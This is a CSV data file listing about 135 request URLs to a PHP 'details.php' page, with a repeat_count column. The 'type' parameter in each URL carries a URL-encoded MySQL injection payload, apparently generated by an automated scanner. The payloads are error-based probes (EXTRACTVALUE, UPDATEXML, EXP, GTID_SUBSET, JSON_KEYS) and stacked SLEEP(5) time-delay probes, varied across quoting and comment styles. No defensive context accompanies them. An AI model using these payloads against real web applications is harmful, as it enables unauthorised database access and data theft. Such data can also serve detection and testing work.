full_url,repeat_count
/details.php?prod=5&type=2%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29,1714
/details.php?prod=5&type=2%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20PkuT,1715
/details.php?prod=5&type=2%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%23%20sAqV,1716
/details.php?prod=5&type=2%29%29%20AS%20mmeB%20WHERE%209985%3D9985%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20PmtT,1717
/details.php?prod=5&type=2%29%20AS%20Lyss%20WHERE%202771%3D2771%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20FeCs,1718
/details.php?prod=5&type=2%60%20WHERE%206541%3D6541%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20Jfbn,1719
/details.php?prod=5&type=2%60%29%20WHERE%204152%3D4152%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20vvup,1720
/details.php?prod=5&type=2%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20uqnO,1721
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20HpvB,1722
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20UZbn,1723
/details.php?prod=5&type=2%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%27jYpl%27%3D%27jYpl,1724
/details.php?prod=5&type=2%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%27yjWn%27%3D%27yjWn,1725
/details.php?prod=5&type=2%27%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%27FBbm%27%3D%27FBbm,1726
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%27czVy%27%3D%27czVy,1727
/details.php?prod=5&type=2%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%27GTdi%27%20LIKE%20%27GTdi,1728
/details.php?prod=5&type=2%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%27oVln%27%20LIKE%20%27oVln,1729
/details.php?prod=5&type=2%27%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%27BqYg%27%20LIKE%20%27BqYg,1730
/details.php?prod=5&type=2%25%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%27BZTY%25%27%3D%27BZTY,1731
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%27PGUZ%27%20LIKE%20%27PGUZ,1732
/details.php?prod=5&type=2%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%22rVKW%22%3D%22rVKW,1733
/details.php?prod=5&type=2%22%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%22DYXK%22%3D%22DYXK,1734
/details.php?prod=5&type=2%22%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%22kXxL%22%3D%22kXxL,1735
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%22dUId%22%3D%22dUId,1736
/details.php?prod=5&type=2%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%22IAMz%22%20LIKE%20%22IAMz,1737
/details.php?prod=5&type=2%22%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%22PJCM%22%20LIKE%20%22PJCM,1738
/details.php?prod=5&type=2%22%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%22TRjK%22%20LIKE%20%22TRjK,1739
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%22YvXD%22%20LIKE%20%22YvXD,1740
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20OR%20%27GFjq%27%3D%27ZgwF,1741
/details.php?prod=5&type=2%27%29%29%20AS%20ocHw%20WHERE%205589%3D5589%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20kxnZ,1742
/details.php?prod=5&type=2%22%29%29%20AS%20JTjL%20WHERE%202555%3D2555%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20PDQp,1743
/details.php?prod=5&type=2%27%29%20AS%20mzNr%20WHERE%204952%3D4952%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20nogt,1744
/details.php?prod=5&type=2%22%29%20AS%20pfyf%20WHERE%205623%3D5623%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20QrKY,1745
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%23,1746
/details.php?prod=5&type=%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284162%3D4162%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29,1747
/details.php?prod=5&type=EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281467%3D1467%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29,1748
/details.php?prod=5&type=GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%282928%3D2928%2C1%29%29%29%2C0x7178706a71%29%2C2928%29,1749
/details.php?prod=5&type=JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288050%3D8050%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29,1750
/details.php?prod=5&type=%28SELECT%201712%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281712%3D1712%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,1751
/details.php?prod=5&type=%28UPDATEXML%283763%2CCONCAT%280x2e%2C0x7176787171%2C%28SELECT%20%28ELT%283763%3D3763%2C1%29%29%29%2C0x7178706a71%29%2C4093%29%29,1752
/details.php?prod=5&type=%28EXTRACTVALUE%287077%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28ELT%287077%3D7077%2C1%29%29%29%2C0x7178706a71%29%29%29,1753
/details.php?prod=5&type=2%2C%28SELECT%202197%20FROM%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%282197%3D2197%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29x%29,1754
/details.php?prod=5&type=2%27%2C%28SELECT%202197%20FROM%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%282197%3D2197%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29x%29--%20CjNg,1755
/details.php?prod=5&type=2%2C%28SELECT%201715%20FROM%20%28SELECT%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281715%3D1715%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29s%29,1756
/details.php?prod=5&type=2%27%2C%28SELECT%201715%20FROM%20%28SELECT%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281715%3D1715%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29s%29--%20sniV,1757
/details.php?prod=5&type=2%2CGTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284043%3D4043%2C1%29%29%29%2C0x7178706a71%29%2C4043%29,1758
/details.php?prod=5&type=2%27%2CGTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284043%3D4043%2C1%29%29%29%2C0x7178706a71%29%2C4043%29--%20uCGr,1759
/details.php?prod=5&type=2%2C%28SELECT%206954%20FROM%20%28SELECT%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%286954%3D6954%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29x%29,1760
/details.php?prod=5&type=2%27%2C%28SELECT%206954%20FROM%20%28SELECT%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%286954%3D6954%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29x%29--%20ufTu,1761
/details.php?prod=5&type=2%2C%28SELECT%206723%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286723%3D6723%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,1762
/details.php?prod=5&type=2%27%2C%28SELECT%206723%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286723%3D6723%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20fxzs,1763
/details.php?prod=5&type=2%2CEXTRACTVALUE%287424%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28ELT%287424%3D7424%2C1%29%29%29%2C0x7178706a71%29%29,1764
/details.php?prod=5&type=2%27%2CEXTRACTVALUE%287424%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28ELT%287424%3D7424%2C1%29%29%29%2C0x7178706a71%29%29--%20WKep,1765
/details.php?prod=5&type=2%2CUPDATEXML%286315%2CCONCAT%280x2e%2C0x7176787171%2C%28SELECT%20%28ELT%286315%3D6315%2C1%29%29%29%2C0x7178706a71%29%2C5605%29,1766
/details.php?prod=5&type=2%27%2CUPDATEXML%286315%2CCONCAT%280x2e%2C0x7176787171%2C%28SELECT%20%28ELT%286315%3D6315%2C1%29%29%29%2C0x7178706a71%29%2C5605%29--%20snzY,1767
/details.php?prod=5&type=2%2C%28SELECT%206392%20FROM%20%28SELECT%20ROW%286392%2C1379%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286392%3D6392%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%201216%20UNION%20SELECT%209392%20UNION%20SELECT%202083%20UNION%20SELECT%207202%29a%20GROUP%20BY%20x%29%29s%29,1768
/details.php?prod=5&type=2%27%2C%28SELECT%206392%20FROM%20%28SELECT%20ROW%286392%2C1379%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286392%3D6392%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%201216%20UNION%20SELECT%209392%20UNION%20SELECT%202083%20UNION%20SELECT%207202%29a%20GROUP%20BY%20x%29%29s%29--%20MjNC,1769
/details.php?prod=5&type=%28SELECT%20CONCAT%280x7176787171%2C%28ELT%286536%3D6536%2C1%29%29%2C0x7178706a71%29%29,1770
/details.php?prod=5&type=2%29%3BSELECT%20SLEEP%285%29%23,1771
/details.php?prod=5&type=2%29%29%3BSELECT%20SLEEP%285%29%23,1772
/details.php?prod=5&type=2%29%29%29%3BSELECT%20SLEEP%285%29%23,1773
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29%23,1774
/details.php?prod=5&type=2%29%29%20AS%20FzJR%20WHERE%202413%3D2413%3BSELECT%20SLEEP%285%29%23,1775
/details.php?prod=5&type=2%29%20AS%20xfbn%20WHERE%208486%3D8486%3BSELECT%20SLEEP%285%29%23,1776
/details.php?prod=5&type=2%60%20WHERE%206399%3D6399%3BSELECT%20SLEEP%285%29%23,1777
/details.php?prod=5&type=2%60%29%20WHERE%201979%3D1979%3BSELECT%20SLEEP%285%29%23,1778
/details.php?prod=5&type=2%60%3D%602%60%3BSELECT%20SLEEP%285%29%23,1779
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%205275%3D5275%3BSELECT%20SLEEP%285%29%23,1780
/details.php?prod=5&type=2%27%29%3BSELECT%20SLEEP%285%29%23,1781
/details.php?prod=5&type=2%27%3BSELECT%20SLEEP%285%29%23,1782
/details.php?prod=5&type=2%22%3BSELECT%20SLEEP%285%29%23,1783
/details.php?prod=5&type=2%27%29%29%3BSELECT%20SLEEP%285%29%23,1784
/details.php?prod=5&type=2%27%29%29%29%3BSELECT%20SLEEP%285%29%23,1785
/details.php?prod=5&type=2%25%27%3BSELECT%20SLEEP%285%29%23,1786
/details.php?prod=5&type=2%22%29%3BSELECT%20SLEEP%285%29%23,1787
/details.php?prod=5&type=2%22%29%29%3BSELECT%20SLEEP%285%29%23,1788
/details.php?prod=5&type=2%22%29%29%29%3BSELECT%20SLEEP%285%29%23,1789
/details.php?prod=5&type=2%27%29%29%20AS%20GiCg%20WHERE%203037%3D3037%3BSELECT%20SLEEP%285%29%23,1790
/details.php?prod=5&type=2%22%29%29%20AS%20aaZi%20WHERE%203971%3D3971%3BSELECT%20SLEEP%285%29%23,1791
/details.php?prod=5&type=2%27%29%20AS%20fGIe%20WHERE%206563%3D6563%3BSELECT%20SLEEP%285%29%23,1792
/details.php?prod=5&type=2%22%29%20AS%20zLVi%20WHERE%208315%3D8315%3BSELECT%20SLEEP%285%29%23,1793
/details.php?prod=5&type=2%22%3D%222%22%3BSELECT%20SLEEP%285%29%23,1794
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%3BSELECT%20SLEEP%285%29%23,1795
/details.php?prod=5&type=2%29%3BSELECT%20SLEEP%285%29--%20gqia,1796
/details.php?prod=5&type=2%29%3BSELECT%20SLEEP%285%29%20AND%20%285111%3D5111,1797
/details.php?prod=5&type=2%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%281540%3D1540,1798
/details.php?prod=5&type=2%29%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%286852%3D6852,1799
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29,1800
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29--%20CjmR,1801
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29%23%20NEGr,1802
/details.php?prod=5&type=2%29%29%20AS%20IGgK%20WHERE%202607%3D2607%3BSELECT%20SLEEP%285%29--%20lTzo,1803
/details.php?prod=5&type=2%29%20AS%20aKIJ%20WHERE%203858%3D3858%3BSELECT%20SLEEP%285%29--%20WpVD,1804
/details.php?prod=5&type=2%60%20WHERE%203437%3D3437%3BSELECT%20SLEEP%285%29--%20zsUs,1805
/details.php?prod=5&type=2%60%29%20WHERE%203923%3D3923%3BSELECT%20SLEEP%285%29--%20uQzw,1806
/details.php?prod=5&type=2%60%3D%602%60%3BSELECT%20SLEEP%285%29%20AND%20%602%60%3D%602,1807
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%209040%3D9040%3BSELECT%20SLEEP%285%29%29%7C%5B2,1808
/details.php?prod=5&type=2%27%29%3BSELECT%20SLEEP%285%29--%20ozTJ,1809
/details.php?prod=5&type=2%27%3BSELECT%20SLEEP%285%29--%20NgNq,1810
/details.php?prod=5&type=2%22%3BSELECT%20SLEEP%285%29--%20amPr,1811
/details.php?prod=5&type=2%27%29%3BSELECT%20SLEEP%285%29%20AND%20%28%27jdrh%27%3D%27jdrh,1812
/details.php?prod=5&type=2%27%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%27tYQp%27%3D%27tYQp,1813
/details.php?prod=5&type=2%27%29%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%28%27PHnB%27%3D%27PHnB,1814
/details.php?prod=5&type=2%27%3BSELECT%20SLEEP%285%29%20AND%20%27MUme%27%3D%27MUme,1815
/details.php?prod=5&type=2%27%29%3BSELECT%20SLEEP%285%29%20AND%20%28%27OIto%27%20LIKE%20%27OIto,1816
/details.php?prod=5&type=2%27%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%27xvVC%27%20LIKE%20%27xvVC,1817
/details.php?prod=5&type=2%27%29%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%28%27UJFa%27%20LIKE%20%27UJFa,1818
/details.php?prod=5&type=2%25%27%3BSELECT%20SLEEP%285%29%20AND%20%27AzwM%25%27%3D%27AzwM,1819
/details.php?prod=5&type=2%27%3BSELECT%20SLEEP%285%29%20AND%20%27gBNi%27%20LIKE%20%27gBNi,1820
/details.php?prod=5&type=2%22%29%3BSELECT%20SLEEP%285%29%20AND%20%28%22fPsX%22%3D%22fPsX,1821
/details.php?prod=5&type=2%22%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%22gdaP%22%3D%22gdaP,1822
/details.php?prod=5&type=2%22%29%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%28%22sHzq%22%3D%22sHzq,1823
/details.php?prod=5&type=2%22%3BSELECT%20SLEEP%285%29%20AND%20%22UuAS%22%3D%22UuAS,1824
/details.php?prod=5&type=2%22%29%3BSELECT%20SLEEP%285%29%20AND%20%28%22GOqy%22%20LIKE%20%22GOqy,1825
/details.php?prod=5&type=2%22%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%22jyzT%22%20LIKE%20%22jyzT,1826
/details.php?prod=5&type=2%22%29%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%28%22nAUM%22%20LIKE%20%22nAUM,1827
/details.php?prod=5&type=2%22%3BSELECT%20SLEEP%285%29%20AND%20%22ktXh%22%20LIKE%20%22ktXh,1828
/details.php?prod=5&type=2%27%3BSELECT%20SLEEP%285%29%20OR%20%27sAok%27%3D%27rFns,1829
/details.php?prod=5&type=2%27%29%29%20AS%20ZXxk%20WHERE%209227%3D9227%3BSELECT%20SLEEP%285%29--%20axDJ,1830
/details.php?prod=5&type=2%22%29%29%20AS%20ucqm%20WHERE%206073%3D6073%3BSELECT%20SLEEP%285%29--%20mUWy,1831
/details.php?prod=5&type=2%27%29%20AS%20FBYi%20WHERE%201522%3D1522%3BSELECT%20SLEEP%285%29--%20uaOm,1832
/details.php?prod=5&type=2%22%29%20AS%20MfBb%20WHERE%201337%3D1337%3BSELECT%20SLEEP%285%29--%20rBoe,1833
/details.php?prod=5&type=2%22%3D%222%22%3BSELECT%20SLEEP%285%29%20AND%20%222%22%3D%222,1834
/details.php?prod=5&type=2%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1835
/details.php?prod=5&type=2%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1836
/details.php?prod=5&type=2%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1837
/details.php?prod=5&type=2%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1838
/details.php?prod=5&type=2%29%29%20AS%20QALZ%20WHERE%204710%3D4710%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1839
/details.php?prod=5&type=2%29%20AS%20oWaY%20WHERE%203852%3D3852%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1840
/details.php?prod=5&type=2%60%20WHERE%208143%3D8143%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1841
/details.php?prod=5&type=2%60%29%20WHERE%208194%3D8194%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1842
/details.php?prod=5&type=2%60%3D%602%60%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1843
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%207664%3D7664%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1844
/details.php?prod=5&type=2%27%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1845
/details.php?prod=5&type=2%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1846
/details.php?prod=5&type=2%22%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1847
/details.php?prod=5&type=2%27%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,1848
